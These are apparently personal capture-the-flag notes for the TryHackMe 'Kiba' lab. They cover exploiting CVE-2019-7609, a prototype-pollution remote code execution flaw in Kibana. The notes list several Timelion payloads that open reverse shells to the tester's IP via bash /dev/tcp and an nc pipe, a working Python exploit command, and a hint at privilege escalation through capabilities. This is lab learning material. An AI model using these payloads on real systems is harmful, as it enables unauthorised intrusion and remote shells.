# Tryhackmebox - Kiba

## recon

IP=10.10.224.182

ports = 22,80,5044,5601

Article explaing a lot about the CVE: https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/


Interesting from nmap: http://10.10.224.182:5601/app/kibana


Ṕayloads tried:

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.9.15.164/9999 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/127.9.15.164/9999 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.15.164 9999 >/tmp/f");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

python CVE-2019-7609-kibana-rce.py -u http://10.10.45.87:5601 -host 10.9.15.164 -port 9999 --shell 

Python script worked!

## Priv Esc

ls -la ~ 
    .hackmeplease is not normal
    custom python file

Since box is about capabilities gtfobins ftw.

